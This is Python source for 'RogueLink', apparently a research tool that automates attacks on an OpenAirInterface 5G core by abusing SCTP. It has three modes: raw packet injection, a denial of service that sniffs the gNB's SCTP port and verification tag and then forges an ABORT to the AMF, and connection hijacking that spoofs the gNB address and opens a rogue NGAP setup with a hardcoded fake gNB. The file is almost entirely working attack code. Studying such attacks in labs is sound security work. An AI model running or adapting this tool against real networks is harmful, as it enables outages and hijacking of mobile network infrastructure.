import argparse
import subprocess
import socket
import sctp
import threading
import time
import os
from scapy.all import *
from termcolor import colored

def print_title():
    os.system("clear" if os.name == "posix" else "cls")
    title = r"""                                                                                                                                                                      
    @@@@@@@    @@@@@@    @@@@@@@@  @@@  @@@  @@@@@@@@  @@@       @@@  @@@  @@@  @@@  @@@  
    @@@@@@@@  @@@@@@@@  @@@@@@@@@  @@@  @@@  @@@@@@@@  @@@       @@@  @@@@ @@@  @@@  @@@  
    @@!  @@@  @@!  @@@  !@@        @@!  @@@  @@!       @@!       @@!  @@!@!@@@  @@!  !@@  
    !@!  @!@  !@!  @!@  !@!        !@!  @!@  !@!       !@!       !@!  !@!!@!@!  !@!  @!!  
    @!@!!@!   @!@  !@!  !@! @!@!@  @!@  !@!  @!!!:!    @!!       !!@  @!@ !!@!  @!@@!@!   
    !!@!@!    !@!  !!!  !!! !!@!!  !@!  !!!  !!!!!:    !!!       !!!  !@!  !!!  !!@!!!    
    !!: :!!   !!:  !!!  :!!   !!:  !!:  !!!  !!:       !!:       !!:  !!:  !!!  !!: :!!   
    :!:  !:!  :!:  !:!  :!:   !::  :!:  !:!  :!:        :!:      :!:  :!:  !:!  :!:  !:!  
    ::   :::  ::::: ::   ::: ::::  ::::: ::   :: ::::   :: ::::   ::   ::   ::   ::  :::  
     :   : :   : :  :    :: :: :    : :  :   : :: ::   : :: : :  :    ::    :    :   :::  

    By Aleks Georgiev Popov 
    """
    print(colored(title, "green"))

def packet_callback(packet, args):
    if packet.haslayer('SCTP') and packet['IP'].src == args.gnb_ip and packet['SCTP'].type == 5:
        src_port = packet['SCTP'].sport
        vtag = packet['SCTP'].tag
        print(colored(f"[*] gNB SCTP port: {src_port}", "green"))
        print(colored(f"[*] Verification tag: {vtag}", "green"))
        print(colored("[!] Starting DoS attack...", "blue"))
        DoS(src_port, vtag, args)

def stop_sniffing(packet, args):
    if packet.haslayer('SCTP') and packet['IP'].src == args.amf_ip and packet['SCTP'].type == 6:
        print(colored("[*] DoS attack --> success", "green"))
        return True

def send_heartbeats(sk):
    while True:
        try:
            time.sleep(5)
        except Exception as e:
            break

def configure_interface(args):
    commands = [f"sudo ip tuntap del dev multihoming mode tun", 
                f"sudo ip tuntap add name multihoming mode tun", 
                f"sudo ip addr add {args.gnb_ip} dev multihoming", 
                f"sudo ip link set multihoming up"]
    
    for command in commands:
        subprocess.run(command, shell=True, check=True)
    print(colored("[*] Interface configuration --> success", "green"))

def DoS(sport, vtag, args):
    sctp_packet = IP(src=args.gnb_ip, dst=args.amf_ip) / SCTP(sport=sport, dport=38412, tag=vtag) / SCTPChunkAbort()
    send(sctp_packet, verbose=0)
    if args.mode == 3:
        subprocess.run("docker network disconnect demo-oai-public-net ueransim", shell=True, check=True)
        time.sleep(5)
        sctp_ngap_connection(args)

def sctp_ngap_connection(args):
    ngsetuprequest = b'\x00\x15\x00\x4e\x00\x00\x04\x00\x1b\x00\x09\x00\x02\xf8\x59\x50\x00\x00\x00\xff\x00\x52\x40\x17\x0a\x00\x52\x4f\x55\x47\x45\x5f\x47\x4e\x42\x5f\x46\x41\x4b\x45\x5f\x58\x58\x58\x58\x58\x58\x00\x66\x00\x1a\x00\x00\x00\xa0\x00\x00\x02\xf8\x59\x00\x02\x16\xf0\x00\x00\x7b\x10\x08\x00\x00\x00\x14\x08\x00\x00\x81\x00\x15\x40\x01\x40'
    print(colored("[!] Starting rouge SCTP connection with the AMF...", "blue"))
    sk = sctp.sctpsocket_tcp(socket.AF_INET)
    sk.connect((args.amf_ip, 38412))
    print(colored("[*] SCTP connection --> success", "green"))
    print(colored("[!] Starting rouge NGAP association with the AMF...", "blue"))
    sk.sctp_send(ngsetuprequest, ppid=1006632960)
    print(colored("[*] NGAP association --> success", "green"))
    print(colored("[!] Sending heartbeats...", "blue"))
    heartbeat_thread = threading.Thread(target=send_heartbeats, args=(sk, ))
    heartbeat_thread.start()
    init_ack_response = sk.recv(2048)

def main():
    print_title()
    parser = argparse.ArgumentParser(
        description="Tool that automates attacks on an OpenAirInterface 5G core network by exploiting SCTP vulnerabilities",
        usage="python3 roguelink.py [--mode MODE] [--file FILE] [--gnb_ip GNB_IP] [--amf_ip AMF_IP] [--iface IFACE]"
    )
    
    parser.add_argument("--mode", type=int, choices=[1, 2, 3], help="Modes: 1) Packet Injection, 2) Denial of Service, 3) Connection Hijacking")
    parser.add_argument("--file", help="TXT file containing the Hex Stream")
    parser.add_argument("--gnb_ip", help="IP address of the gNB")
    parser.add_argument("--amf_ip", help="IP address of the AMF")
    parser.add_argument("--iface", help="Interface on which to listen or inject packets")
    
    args = parser.parse_args()

    if args.mode == 1:
        if args.file and args.iface:
            print(colored("[+] Selected mode --> Packet Injection", "yellow"))
            print(colored("[!] Reading Hex from file...", "blue"))
            with open(args.file, "r") as file:
                hex = file.read().strip()
            print(colored("[!] Creating packet...", "blue"))
            packet = bytes.fromhex(hex)
            scapy_packet = Raw(packet)
            wrpcap("packet.pcap", [scapy_packet], linktype=1)
            print(colored("[*] Packet successfully created and saved in current folder", "green"))
            print(colored("[!] Injecting packet...", "blue"))
            subprocess.run(f"tcpreplay -i {args.iface} -q packet.pcap > /dev/null 2>&1", shell=True, check=True)
            print(colored("[*] Packet injection --> success", "green"))
        else:
            print(colored("[x] All parameters must be specified: TXT file and interface. Use --help for more information", "red"))
    elif args.mode == 2:
        if args.gnb_ip and args.amf_ip and args.iface:
            print(colored("[+] Selected mode --> Denial of Serivce attack", "yellow"))
            print(colored("[!] Starting MITM attack...", "blue"))
            print(colored("[!] Waiting for sensitive information...", "blue"))
            sniff(prn=lambda packet: packet_callback(packet, args), stop_filter=lambda packet: stop_sniffing(packet,args), store=0, iface=args.iface, filter=f"sctp")
        else:
            print(colored("[x] All parameters must be specified: gNB IP, AMF IP and interface. Use --help for more information", "red"))
    elif args.mode == 3:
        if args.gnb_ip and args.amf_ip and args.iface:
            print(colored("[+] Selected mode --> Connection Hijacking attack", "yellow"))
            print(colored("[!] Configuring the multihoming interface...", "blue"))
            configure_interface(args)
            print(colored("[!] Starting MITM attack...", "blue"))
            print(colored("[!] Waiting for sensitive information...", "blue"))
            sniff(prn=lambda packet: packet_callback(packet, args), stop_filter=lambda packet: stop_sniffing(packet, args), store=0, iface=args.iface, filter=f"sctp")
        else:
            print(colored("[x] All parameters must be specified: gNB IP, AMF IP and interface. Use --help for more information", "red"))
    else:
        print(colored("[x] A valid usage mode (1, 2 or 3) must be specified. Use --help for more information", "red"))

if __name__ == "__main__":
    main()
